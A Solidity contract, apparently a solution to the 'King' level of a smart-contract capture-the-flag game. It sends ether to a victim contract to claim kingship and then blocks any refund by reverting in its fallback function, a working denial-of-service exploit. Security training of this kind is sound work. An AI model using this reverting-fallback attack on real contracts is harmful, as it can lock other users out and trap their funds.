// SPDX-License-Identifier: MIT
// locked pragma
pragma solidity 0.4.26;

/// @title Attack contract, to remain king no matter what!
/// @author Web3 Blockchain Developer
contract KingAttack {

    /** @notice Player will call the fallback function of victim contract using
    this constructor and pass the value the player enters before the attack contract 
    is deployed. Player will become king. */
    constructor(address _king) public payable {
        address(_king).call.value(msg.value)();
    }

    /** @notice Player will submit instance and the level contract will 
    call this fallback function that will revert and player will remain king
    to complete this level! */
    function() public payable {
        revert('you lose!');
    }
}